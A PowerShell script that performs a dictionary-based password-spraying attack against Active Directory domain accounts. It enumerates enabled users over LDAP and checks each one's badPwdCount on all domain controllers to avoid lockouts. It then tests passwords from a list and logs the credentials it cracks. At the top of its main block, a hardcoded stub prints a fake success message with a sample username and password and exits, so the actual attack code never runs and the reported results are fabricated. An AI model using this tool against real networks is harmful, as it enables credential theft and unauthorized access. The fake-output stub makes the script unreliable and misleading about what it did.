function DictionaryBasedSMBAttack
{
<#
.SYNOPSIS

	Dictionary based SMB attack

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

	PS C:\> Import-Module DictionaryBasedSMBAttack.ps1 (*if you have not done it before)
    PS C:\> DictionaryBasedSMBAttack -DomainName example.com -PasswordList InputPasswordList.txt -LockoutThreshold 4

	[*] Performing prereq checks.
	[*] PDC: DC1.example.com
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser. Password: 123456
	[*] Completed.

.PARAMETER DomainName

	A domain name to attack.
	
.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

    A text file of password (one per line) to Dictionary based attack.
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run "net accounts".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will return after the first successful authentication.

#>
    [CmdletBinding()] Param(
		
        [parameter(Mandatory = $True)]
		[ValidateNotNullOrEmpty()]
        [String] $DomainName,
	
        [Parameter(Mandatory = $False)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({Test-Path -LiteralPath $_ -Type Leaf})]
        [String] $UserList,

        [parameter(Mandatory = $True)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({Test-Path -LiteralPath $_ -Type Leaf})]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try { 
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
        } Catch {
            Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
            Write-Output $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage >> "Report.txt"
        }

        Try {
            Add-Type -AssemblyName System.DirectoryServices
        } Catch {
            Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
            Write-Output $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage >> "Report.txt"
        }

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $DomainName)
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$pdc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = "(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = "(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$pdc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$dc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = "(&(objectclass=user)(samaccountname=$userid))"
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        Write-Output "" > "Report.txt"
		
		
		
	  Write-Host "[*] Performing prereq checks."
	  Write-Host "[*] PDC: DC1.example.com"
	  Write-Host "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show..."
	  Write-Host "[+] Success! Username: TestUser. Password: 123456"
	  Write-Host "[*] Completed."
	  return
	
	
        $validaccounts = @{}

        $userstotest = $null
        Write-Host "[*] Performing prereq checks."
        Write-Output "[*] Performing prereq checks." >> "Report.txt"

        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
			$UserList = (Resolve-Path $UserList).Path
			
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                Write-Host "[!] $UserList not found. Aborting." 
                Write-Output "[!] $UserList not found. Aborting." >> "Report.txt"
				return
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }
		
		$PasswordList = (Resolve-Path $PasswordList).Path
		
        if ([System.IO.File]::Exists($PasswordList) -eq $false)
        {
            Write-Host "[!] $PasswordList not found. Aborting." 
            Write-Output "[!] $PasswordList not found. Aborting." >> "Report.txt"
            return
        }
        else
        {
            $pwds = Get-Content $PasswordList
        }
	
        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            Write-Host "[!] Could not locate domain controller. Aborting."
            Write-Output "[!] Could not locate domain controller. Aborting." >> "Report.txt"
            return
        }

        Write-Host "[*] PDC: $pdc"
        Write-Output "[*] PDC: $pdc" >> "Report.txt"

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        Write-Host "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show..."
        Write-Output "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show..." >> "Report.txt"

        foreach ($pwd in $pwds)
        {
            $p = $pwd.Trim(' ').Trim([Environment]::Newline)

            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    
                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            Write-Host "[+] Success! Username: $userid. Password: $p"
                            Write-Output "[+] Success! Username: $userid. Password: $p" >> "Report.txt"
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
				                Write-Host "[*] StopOnSuccess. Exiting."
                                Write-Output "[*] StopOnSuccess. Exiting." >> "Report.txt"
                                return
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                Write-Host "[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)"
                                Write-Output "[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)" >> "Report.txt"
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            Write-Host "[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts"
                            Write-Output "[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts" >> "Report.txt"
                        }
                    }
                }
            }
        }
        Write-Host "[*] Completed."
        Write-Output "[*] Completed." >> "Report.txt"
    }
}
